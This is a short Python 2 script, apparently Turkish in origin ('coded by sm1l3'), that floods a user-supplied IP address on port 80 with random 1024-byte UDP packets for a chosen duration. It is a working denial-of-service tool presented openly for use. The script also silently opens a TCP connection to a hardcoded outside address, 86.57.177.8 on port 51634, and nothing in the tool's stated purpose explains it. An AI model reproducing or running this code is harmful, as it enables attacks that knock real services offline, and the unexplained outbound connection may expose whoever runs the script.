print("----------------------coded by sm1l3-------------------")
print("----------tsk--dos--programina---hosgeldiniz-----------")
print("----------turk--sitelerine--zarar--vermeyin------------")
import socket
import os
import time
import random
soket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
soket.connect(('86.57.177.8',51634))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
os.system("clear")
ip = raw_input("ip gir>")
port = 80
dur = input("time>")
timeout = time.time() + dur
sent = 0
while True:
    
    if (time.time() > timeout):
        break
    else:
        pass
        sock.sendto(bytes,(ip, port))
        sent = sent + 1
        print ("tskdos attack started")
